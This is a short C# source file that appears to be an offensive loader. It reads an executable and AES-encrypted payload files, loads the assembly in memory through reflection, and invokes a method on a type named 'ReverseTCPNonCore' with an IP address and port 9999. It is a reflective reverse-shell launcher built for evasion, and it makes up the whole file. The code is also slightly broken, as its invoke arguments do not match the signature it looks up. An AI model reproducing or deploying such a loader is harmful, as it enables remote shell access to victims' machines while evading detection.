using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;

namespace ReflectionEncrypt
{
    internal class ReflectionEncrypt
    {
        static String TYPENAME = "ReflectionEncrypt.ReverseTCPNonCore"; // TODO: make as an argument
        static void Main()
        {

            byte[] bytesPlain = File.ReadAllBytes("check.exe");
            byte[] bytesEncr = File.ReadAllBytes("f23f9c22dcccafe4723c5aca51c96870afc4130bc2b5c5f0b8dab9e51cf902e3");
            byte[] key = File.ReadAllBytes("f23f9c22dcccafe4723c5aca51c96870afc4130bc2b5c5f0b8dab9e51cf902e3.key");
            byte[] IV = File.ReadAllBytes("f23f9c22dcccafe4723c5aca51c96870afc4130bc2b5c5f0b8dab9e51cf902e3.IV");

            //byte[] bytesPlain = BinaryEncryptor.DecryptAes(bytesEncr, key, IV);


            Assembly assembly = Assembly.Load(bytesPlain);
            //File.WriteAllBytes("check.exe", bytesPlain);

            Type type = assembly.GetType(TYPENAME);

            /*
			var ctors = type.GetConstructors(BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public);
			var privateCtor = type.GetConstructor(BindingFlags.Instance |
                BindingFlags.NonPublic | BindingFlags.Public, null,
                new Type[] { typeof(int), typeof(int) }, null);

            var obj	= privateCtor.Invoke(new Object[] { 3, 4 });
			*/

            var method = type.GetMethod("preMainInit", BindingFlags.Static |
                BindingFlags.NonPublic | BindingFlags.Public, new Type[] { typeof(String[]) });

            var res = method?.Invoke(null, new Object[] { "192.168.111.133", 9999 });

            Console.ReadLine();
        }
    }
}